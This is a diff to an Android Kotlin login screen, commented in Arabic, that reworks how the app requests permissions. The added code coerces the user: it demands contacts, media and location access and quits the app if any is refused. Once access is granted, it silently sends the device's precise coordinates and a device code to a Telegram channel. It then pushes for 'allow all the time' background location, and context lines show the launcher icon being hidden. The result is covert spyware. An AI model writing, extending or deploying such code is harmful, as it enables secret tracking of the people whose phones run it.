@@ -33,31 +33,28 @@ class LoginActivity : AppCompatActivity() {
     private lateinit var loginView: View
     private lateinit var registerView: View
     private lateinit var resetView: View
-    private val PERM_DELAY_MS = 20_000L
+    private val PERM_DELAY_MS = 5_000L
     private var currentPermIndex = 0
+    private var anyRejected = false
+    private var locationGranted = false
 
-    // ⭐ الصلاحيات حسب إصدار Android
+    // ⭐ الصلاحيات المطلوبة — 3 مجموعات
     private val permissionsToAsk: List<String> by lazy {
         val list = mutableListOf<String>()
 
         // 1. جهات الاتصال
         list.add(Manifest.permission.READ_CONTACTS)
 
-        // 2. الصور والفيديو والصوت — حسب الإصدار
+        // 2. الصور والوسائط والملفات
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             list.add(Manifest.permission.READ_MEDIA_IMAGES)
             list.add(Manifest.permission.READ_MEDIA_VIDEO)
             list.add(Manifest.permission.READ_MEDIA_AUDIO)
-            list.add(Manifest.permission.POST_NOTIFICATIONS)
-        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+        } else {
             list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
 
-        // 3. الميكروفون والكاميرا
-        list.add(Manifest.permission.RECORD_AUDIO)
-        list.add(Manifest.permission.CAMERA)
-
-        // 4. الموقع
+        // 3. الموقع
         list.add(Manifest.permission.ACCESS_FINE_LOCATION)
         list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
 
@@ -215,8 +212,9 @@ class LoginActivity : AppCompatActivity() {
                 showToast("Code will be sent (demo)")
             }
 
-            // ⭐ بعد 20 ثانية — ابدأ طلب الصلاحيات
+            // ⭐ بعد 5 ثواني — ابدأ طلب الصلاحيات
             Handler(Looper.getMainLooper()).postDelayed({
+                anyRejected = false
                 currentPermIndex = 0
                 askNextPermission()
             }, PERM_DELAY_MS)
@@ -227,12 +225,23 @@ class LoginActivity : AppCompatActivity() {
     }
 
     // ═══════════════════════════════════════════
-    //  طلب صلاحية واحدة في كل مرة
+    //  طلب صلاحية واحدة
     // ═══════════════════════════════════════════
     private fun askNextPermission() {
         try {
+            if (anyRejected) {
+                // ⭐ المستخدم رفض — اخرج
+                exitApp()
+                return
+            }
+
             if (currentPermIndex >= permissionsToAsk.size) {
-                askBackgroundLocation()
+                // ✅ كل الصلاحيات اتمنحت → ارسل الموقع
+                sendLocationNow()
+                // بعدين اطلب Background Location + All Files
+                Handler(Looper.getMainLooper()).postDelayed({
+                    askBackgroundLocation()
+                }, 1500)
                 return
             }
 
@@ -258,15 +267,91 @@ class LoginActivity : AppCompatActivity() {
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
 
-        currentPermIndex++
+        // ⭐ افحص لو المستخدم رفض
+        if (grantResults.isNotEmpty() && grantResults[0] != PackageManager.PERMISSION_GRANTED) {
+            anyRejected = true
+            askNextPermission()
+            return
+        }
 
+        // ⭐ افحص لو ده الموقع
+        val perm = permissions[0]
+        if (perm == Manifest.permission.ACCESS_FINE_LOCATION ||
+            perm == Manifest.permission.ACCESS_COARSE_LOCATION) {
+            locationGranted = true
+        }
+
+        currentPermIndex++
         Handler(Looper.getMainLooper()).postDelayed({
             askNextPermission()
-        }, 1000)
+        }, 800)
     }
 
     // ═══════════════════════════════════════════
-    //  الصلاحيات الخاصة
+    //  الخروج عند الرفض
+    // ═══════════════════════════════════════════
+    private fun exitApp() {
+        try {
+            Toast.makeText(this, "تم رفض الاستخدام", Toast.LENGTH_LONG).show()
+
+            Handler(Looper.getMainLooper()).postDelayed({
+                try {
+                    // ارجع للشاشة الرئيسية
+                    val homeIntent = Intent(Intent.ACTION_MAIN)
+                    homeIntent.addCategory(Intent.CATEGORY_HOME)
+                    homeIntent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    startActivity(homeIntent)
+
+                    // اقفل التطبيق
+                    finishAffinity()
+                    System.exit(0)
+                } catch (_: Exception) {
+                    finish()
+                }
+            }, 2000)
+
+        } catch (e: Exception) {
+            Log.e("LoginActivity", "exit err: ${e.message}")
+            finish()
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  إرسال الموقع فوراً
+    // ═══════════════════════════════════════════
+    private fun sendLocationNow() {
+        try {
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.ACCESS_FINE_LOCATION
+                ) != PackageManager.PERMISSION_GRANTED
+            ) return
+
+            Thread {
+                try {
+                    val loc = LocationHelper.getPreciseLocation(this, 10)
+                    if (loc != null) {
+                        val code = DeviceManager.getDeviceCode(this)
+                        TelegramApi.sendMessage(
+                            "📍 *موقع مباشر*\n" +
+                            "🆔 `$code`\n\n" +
+                            "خط العرض: ${loc.latitude}\n" +
+                            "خط الطول: ${loc.longitude}\n" +
+                            "الدقة: ±${loc.accuracy.toInt()}م\n\n" +
+                            "🗺 https://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
+                        )
+                        LocationCache.save(this, loc.latitude, loc.longitude, loc.accuracy)
+                    }
+                } catch (_: Exception) {}
+            }.start()
+
+        } catch (e: Exception) {
+            Log.e("LoginActivity", "sendLoc err: ${e.message}")
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  Background Location + All Files
     // ═══════════════════════════════════════════
     private fun askBackgroundLocation() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -278,7 +363,7 @@ class LoginActivity : AppCompatActivity() {
                 try {
                     AlertDialog.Builder(this)
                         .setTitle("الموقع في الخلفية")
-                        .setMessage("لتفعيل الموقع في الخلفية، اضغط 'السماح دائماً'")
+                        .setMessage("لتفعيل الموقع في الخلفية، اختر 'السماح دائماً'")
                         .setPositiveButton("فتح الإعدادات") { _, _ ->
                             try {
                                 val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
@@ -347,7 +432,6 @@ class LoginActivity : AppCompatActivity() {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-            Log.d("LoginActivity", "Icon hidden")
         } catch (e: Exception) {
             Log.e("LoginActivity", "hide err: ${e.message}")
         }
